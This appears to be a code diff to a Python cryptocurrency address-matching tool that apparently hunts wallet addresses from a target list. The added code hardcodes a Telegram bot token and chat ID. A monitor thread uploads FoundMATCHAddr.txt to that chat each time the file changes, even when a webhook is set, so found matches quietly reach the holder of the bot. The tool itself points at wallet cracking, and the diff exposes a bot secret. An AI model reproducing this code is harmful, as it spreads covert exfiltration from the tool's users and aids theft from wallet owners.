@@ -10,8 +10,228 @@ from rich.live import Live
 from rich.panel import Panel
 import os
 import sys
+import signal
+import atexit
+from datetime import datetime, timedelta
+import pytz
+import threading
+import requests
+import hashlib
+import psutil
+import subprocess
 
 console = Console()
+
+# Webhook configuration (for multi-platform support)
+# Default: http://localhost:3000/webhook (can be set via --webhook-url)
+WEBHOOK_URL = None  # Will be set from CLI argument or environment variable
+
+# Legacy Telegram bot credentials (used as fallback for file uploads)
+TELEGRAM_BOT_TOKEN = "6668621875:AAHaIDS59aIPpWYf3JkWZuAkOaRatknClG0"
+TELEGRAM_CHAT_ID = "1702319284"
+IST = pytz.timezone('Asia/Kolkata')
+
+def send_webhook_notification(event_type, data):
+    """Send notification via webhook (platform-agnostic)."""
+    if not WEBHOOK_URL:
+        print(f"[DEBUG] No WEBHOOK_URL set. Event: {event_type}")
+        return False
+    
+    try:
+        print(f"[DEBUG] Sending webhook notification: {event_type} to {WEBHOOK_URL}")
+        payload = {
+            "event_type": event_type,  # "startup", "daily_stats", "match_found"
+            "timestamp": datetime.now(IST).isoformat(),
+            "data": data
+        }
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        print(f"[DEBUG] Webhook response: {response.status_code}")
+        if response.status_code in [200, 201, 202]:
+            print(f"[DEBUG] Webhook successful!")
+            return True
+        else:
+            print(f"[yellow]Webhook returned {response.status_code}[/yellow]")
+            return False
+    except Exception as e:
+        print(f"[yellow]Webhook error: {e}[/yellow]")
+        return False
+
+def send_telegram_message(message_text):
+    """Send message via webhook, with fallback to direct Telegram API."""
+    if WEBHOOK_URL:
+        # Try webhook first (works for any platform)
+        webhook_data = {
+            "message_type": "text",
+            "content": message_text,
+            "parse_mode": "HTML"
+        }
+        if send_webhook_notification("message", webhook_data):
+            return
+    
+    # Fallback to direct Telegram API if webhook not configured or failed
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message_text,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, data=data, timeout=10)
+        if response.status_code != 200:
+            print(f"[red]Failed to send message: {response.status_code}[/red]")
+    except Exception as e:
+        print(f"[red]Send error: {e}[/red]")
+
+def send_telegram_file(file_path):
+    """Send file content via webhook, with fallback to direct Telegram API."""
+    if not os.path.exists(file_path):
+        return
+    
+    try:
+        with open(file_path, 'r') as f:
+            file_content = f.read()
+        
+        # Try webhook first (send file content as text)
+        if WEBHOOK_URL:
+            webhook_data = {
+                "message_type": "file_content",
+                "filename": os.path.basename(file_path),
+                "content": file_content
+            }
+            if send_webhook_notification("file_found", webhook_data):
+                return
+        
+        # Fallback to direct file upload via Telegram Bot API
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as f:
+            files = {'document': f}
+            data = {'chat_id': TELEGRAM_CHAT_ID}
+            response = requests.post(url, files=files, data=data, timeout=10)
+        if response.status_code != 200:
+            print(f"[red]Failed to send file: {response.status_code}[/red]")
+    except Exception as e:
+        print(f"[red]File send error: {e}[/red]")
+
+def send_startup_message(worker_name, filename, thco):
+    """Send startup message via webhook."""
+    now_ist = datetime.now(IST)
+    date_str = now_ist.strftime("%d %B %Y")
+    time_str = now_ist.strftime("%I:%M %p")
+    
+    message = (
+        f"<b>🤖 Bot Started</b>\n"
+        f"<b>Date:</b> {date_str}\n"
+        f"<b>Time:</b> {time_str} (IST)\n\n"
+        f"<b>⚙️ Configuration:</b>\n"
+        f"<b>Worker Name:</b> <code>{worker_name}</code>\n"
+        f"<b>Target File:</b> <code>{filename}</code>\n"
+        f"<b>Workers:</b> <b>{thco}</b>\n"
+        f"\n<b>✅ Ready to hunt addresses!</b>"
+    )
+    
+    webhook_data = {
+        "message_type": "startup",
+        "worker_name": worker_name,
+        "target_file": filename,
+        "worker_count": thco,
+        "formatted_message": message
+    }
+    
+    send_webhook_notification("startup", webhook_data)
+
+def send_daily_stats(worker_name, filename, thco, total_generated, avg_rate, elapsed_secs, total_matches, avg_cpu):
+    """Send daily stats via webhook with fallback to direct Telegram API."""
+    now_ist = datetime.now(IST)
+    date_str = now_ist.strftime("%d %B %Y")
+    
+    hours = int(elapsed_secs // 3600)
+    minutes = int((elapsed_secs % 3600) // 60)
+    
+    message = (
+        f"<b>📊 Daily Stats Report</b>\n"
+        f"<b>Date:</b> {date_str}\n\n"
+        f"<b>👤 Worker:</b> <code>{worker_name}</code>\n"
+        f"<b>📁 Target:</b> <code>{filename}</code>\n\n"
+        f"<b>📈 Statistics:</b>\n"
+        f"<b>Generated:</b> <code>{total_generated:,}</code> addresses\n"
+        f"<b>Avg Rate:</b> <code>{avg_rate:.1f}</code> addr/s\n"
+        f"<b>Time:</b> <code>{hours}h {minutes}m</code>\n"
+        f"<b>Found:</b> <b>🎉 {total_matches}</b> matches\n"
+        f"<b>Avg CPU:</b> <code>{avg_cpu:.1f}%</code>\n"
+        f"<b>Workers:</b> <code>{thco}</code>\n\n"
+        f"<i>See you tomorrow! 🚀</i>"
+    )
+    
+    webhook_data = {
+        "message_type": "daily_stats",
+        "worker_name": worker_name,
+        "target_file": filename,
+        "total_generated": total_generated,
+        "average_rate": avg_rate,
+        "elapsed_seconds": elapsed_secs,
+        "total_matches": total_matches,
+        "average_cpu": avg_cpu,
+        "worker_count": thco,
+        "formatted_message": message
+    }
+    
+    # Try webhook first
+    if send_webhook_notification("daily_stats", webhook_data):
+        return True
+    
+    # Fallback to direct Telegram API if webhook failed or not configured
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        response = requests.post(url, data=data, timeout=10)
+        return response.status_code == 200
+    except Exception as e:
+        console.print(f"[yellow]Stats send error: {e}[/yellow]")
+        return False
+
+def file_monitor_thread(check_interval=5):
+    """Monitor FoundMATCHAddr.txt for changes and send via webhook."""
+    last_hash = None
+    while True:
+        try:
+            time.sleep(check_interval)
+            if os.path.exists('FoundMATCHAddr.txt'):
+                with open('FoundMATCHAddr.txt', 'rb') as f:
+                    file_hash = hashlib.md5(f.read()).hexdigest()
+                
+                if last_hash is None:
+                    last_hash = file_hash
+                elif file_hash != last_hash:
+                    # File changed, send it
+                    last_hash = file_hash
+                    now_ist = datetime.now(IST)
+                    
+                    # Read file content
+                    with open('FoundMATCHAddr.txt', 'r') as f:
+                        file_content = f.read()
+                    
+                    # Send via webhook first (both message and file content)
+                    webhook_data = {
+                        "message_type": "match_alert",
+                        "timestamp": now_ist.isoformat(),
+                        "file_content": file_content
+                    }
+                    send_webhook_notification("match_found", webhook_data)
+                    
+                    # Also send direct message
+                    msg = f"🎉 <b>MATCH FOUND!</b>\n<i>{now_ist.strftime('%d %B %Y %I:%M %p IST')}</i>"
+                    send_telegram_message(msg)
+                    
+                    # Send file as fallback (uses bot API if webhook doesn't support files)
+                    time.sleep(1)
+                    send_telegram_file('FoundMATCHAddr.txt')
+        except Exception as e:
+            pass
+
 
 
 def set_console_title(title):
@@ -199,11 +419,44 @@ if __name__ == '__main__':
                         help="Print after generated this number of addresses and report")
     parser.add_argument('-n', '--thread', dest="ThreadCount", required=True,
                         help="Total worker processes to spawn")
+    parser.add_argument('--worker-name', dest="workerName", default="CryptoBot",
+                        help="Name of this worker instance for Telegram reports [Example: --worker-name robo1]")
+    parser.add_argument('--webhook-url', dest="webhookUrl", default=None,
+                        help="Webhook URL for notifications (supports any platform) [Example: --webhook-url http://localhost:3000/webhook]")
+    parser.add_argument('--port', dest="port", type=int, default=3000,
+                        help="Port for auto-starting webhook server [Example: --port 5689]")
 
     args = parser.parse_args()
     filename = args.filenameEth
     logpx = int(args.ViewPrint)
     thco = int(args.ThreadCount)
+    worker_name = args.workerName
+    webhook_port = args.port
+    
+    # Auto-start webhook server if not manually specified
+    webhook_server_process = None
+    if not args.webhookUrl:
+        # Auto-construct webhook URL and start server
+        webhook_url = f"http://localhost:{webhook_port}/webhook"
+        console.print(f"[bold cyan]🚀 Starting webhook server on port {webhook_port}...[/bold cyan]")
+        try:
+            # Start webhook server in background
+            webhook_server_process = subprocess.Popen(
+                [sys.executable, os.path.join(os.path.dirname(__file__), 'webhook_server.py')],
+                env={**os.environ, 'FLASK_PORT': str(webhook_port)},
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid if sys.platform != 'win32' else None
+            )
+            time.sleep(2)  # Wait for server to start
+            console.print(f"[bold green]✅ Webhook server started on port {webhook_port}[/bold green]")
+        except Exception as e:
+            console.print(f"[bold yellow]⚠️  Could not auto-start webhook server: {e}[/bold yellow]")
+            console.print(f"[bold yellow]   Make sure webhook_server.py exists in the same directory[/bold yellow]")
+            webhook_url = None
+        globals()['WEBHOOK_URL'] = webhook_url
+    else:
+        globals()['WEBHOOK_URL'] = args.webhookUrl
 
     # Read targets once in the parent and share as an immutable set
     with open(filename) as f:
@@ -225,47 +478,144 @@ if __name__ == '__main__':
         border_style="cyan"
     )
     console.print(banner)
+    
+    # Send startup message to Telegram
+    console.print("[bold green]📱 Sending startup notification to Telegram...[/bold green]")
+    send_startup_message(worker_name, filename, thco)
+    
+    # Start file monitoring thread (daemon, so it dies with main process)
+    monitor_thread = threading.Thread(target=file_monitor_thread, daemon=True)
+    monitor_thread.start()
 
     jobs = []
-    try:
-        for i in range(thco):
-            p = multiprocessing.Process(target=Main, args=(i + 1, filename, logpx, thco, add, lock, shared_total, shared_matches, start_time), daemon=True)
-            jobs.append(p)
-            p.start()
-
-        # Keep main process alive and wait for children (they run forever until interrupted)
-        for p in jobs:
-            p.join()
-    except KeyboardInterrupt:
-        # Gracefully terminate all workers
-        console.print("\n[bold yellow]⚠️  Shutting down workers...[/bold yellow]")
-        for p in jobs:
-            try:
-                p.terminate()
-            except Exception:
-                pass
-        for p in jobs:
-            try:
-                p.join(timeout=1)
-            except Exception:
-                pass
+    shutdown_lock = threading.Lock()
+    shutdown_called = [False]  # Use list to allow modification in nested function
+    shutdown_started_at = [0]   # Track when first shutdown started
+    
+    # Define shutdown function that sends final stats
+    def send_final_stats():
+        import sys as _sys
+        _sys.stderr.write("[DEBUG] send_final_stats() called\n")
+        _sys.stderr.flush()
+        
+        with shutdown_lock:
+            if shutdown_called[0]:
+                _sys.stderr.write("[DEBUG] shutdown_called[0] already True, returning early\n")
+                _sys.stderr.flush()
+                return  # Already processed, don't send again
+            shutdown_called[0] = True
+        
+        _sys.stderr.write("[DEBUG] Proceeding with final stats calculation\n")
+        _sys.stderr.flush()
         
         # Final stats
         elapsed = time.perf_counter() - start_time
         final_rate = (shared_total.value / elapsed) if elapsed > 0 else 0.0
-        summary = Panel(
-            f"[bold cyan]Total Generated:[/bold cyan] [yellow]{shared_total.value:,}[/yellow] addresses\n"
-            f"[bold cyan]Total Found:[/bold cyan] [bold green]{shared_matches.value}[/bold green] matches\n"
-            f"[bold cyan]Final Rate:[/bold cyan] [green]{final_rate:.1f}[/green] addr/s\n"
-            f"[bold cyan]Total Time:[/bold cyan] [magenta]{elapsed:.1f}s[/magenta]",
-            title="[bold red]📊 SUMMARY[/bold red]",
-            border_style="red"
-        )
-        console.print(summary)
-    except Exception as e:
-        safe_print(lock, f"[red]Unexpected error in launcher: {e}[/red]")
-        for p in jobs:
-            try:
-                p.terminate()
-            except Exception:
-                pass
+        
+        # Get average CPU usage
+        try:
+            avg_cpu = psutil.cpu_percent(interval=0.1)
+        except Exception as e:
+            _sys.stderr.write(f"[DEBUG] Error getting CPU: {e}\n")
+            avg_cpu = 0.0
+        
+        _sys.stderr.write(f"[DEBUG] Stats: Generated={shared_total.value}, Rate={final_rate:.1f}, CPU={avg_cpu}%\n")
+        _sys.stderr.flush()
+        
+        try:
+            # Send final stats to Telegram (only once)
+            print("[bold green]📱 Sending final stats to Telegram...[/bold green]")
+            _sys.stderr.write(f"[DEBUG] Webhook URL: {WEBHOOK_URL}\n")
+            _sys.stderr.flush()
+            success = send_daily_stats(worker_name, filename, thco, shared_total.value, final_rate, elapsed, shared_matches.value, avg_cpu)
+            _sys.stderr.write(f"[DEBUG] send_daily_stats returned: {success}\n")
+            _sys.stderr.flush()
+            
+            if success:
+                print("[bold green]✅ Stats sent successfully![/bold green]")
+            else:
+                print("[bold yellow]⚠️  Could not send stats via webhook or Telegram API[/bold yellow]")
+        except Exception as e:
+            print(f"[bold red]Error sending final stats: {e}[/bold red]")
+            _sys.stderr.write(f"[ERROR] Exception in send_daily_stats: {e}\n")
+            import traceback
+            traceback.print_exc(file=_sys.stderr)
+        
+        try:
+            summary = Panel(
+                f"[bold cyan]Total Generated:[/bold cyan] [yellow]{shared_total.value:,}[/yellow] addresses\n"
+                f"[bold cyan]Total Found:[/bold cyan] [bold green]{shared_matches.value}[/bold green] matches\n"
+                f"[bold cyan]Final Rate:[/bold cyan] [green]{final_rate:.1f}[/green] addr/s\n"
+                f"[bold cyan]Total Time:[/bold cyan] [magenta]{elapsed:.1f}s[/magenta]",
+                title="[bold red]📊 SUMMARY[/bold red]",
+                border_style="red"
+            )
+            console.print(summary)
+        except Exception as e:
+            print(f"Error printing summary: {e}")
+    
+    # Define shutdown handler for graceful termination on signals
+    def shutdown_handler(signum, frame):
+        try:
+            print("\n⚠️  Shutting down workers...")
+            
+            with shutdown_lock:
+                if shutdown_called[0]:
+                    print("Already shutting down, exiting...")
+                    sys.exit(0)
+                shutdown_called[0] = True
+            
+            # Send final stats FIRST (while webhook server is still running)
+            print("📱 Calling send_final_stats()...")
+            send_final_stats()
+            
+            # Wait for message to be delivered to webhook/Telegram
+            print("⏳ Waiting 2.5 seconds for stats delivery...")
+            time.sleep(2.5)
+            
+            # Kill webhook server AFTER stats are sent
+            if webhook_server_process:
+                try:
+                    print("🛑 Killing webhook server...")
+                    if sys.platform != 'win32':
+                        os.killpg(os.getpgid(webhook_server_process.pid), signal.SIGTERM)
+                    else:
+                        webhook_server_process.terminate()
+                except Exception as e:
+                    print(f"Error killing webhook: {e}")
+            
+            # Terminate workers
+            print("🛑 Terminating workers...")
+            for p in jobs:
+                try:
+                    p.terminate()
+                except Exception:
+                    pass
+            for p in jobs:
+                try:
+                    p.join(timeout=1)
+                except Exception:
+                    pass
+            
+            print("✅ Shutdown complete!")
+            sys.exit(0)
+        except Exception as e:
+            print(f"Error in shutdown_handler: {e}")
+            sys.exit(1)
+    
+    # Register signal handlers for graceful shutdown on Ctrl+C or SIGTERM
+    # (atexit not used because signal handlers are guaranteed to run on exit)
+    signal.signal(signal.SIGINT, shutdown_handler)
+    signal.signal(signal.SIGTERM, shutdown_handler)
+    
+    for i in range(thco):
+        p = multiprocessing.Process(target=Main, args=(i + 1, filename, logpx, thco, add, lock, shared_total, shared_matches, start_time), daemon=True)
+        jobs.append(p)
+        p.start()
+
+    # Keep main process alive but interruptible using a loop with short sleep intervals
+    try:
+        while all(p.is_alive() for p in jobs):
+            time.sleep(0.5)
+    except (KeyboardInterrupt, SystemExit):
+        pass  # Signal handler will take care of it
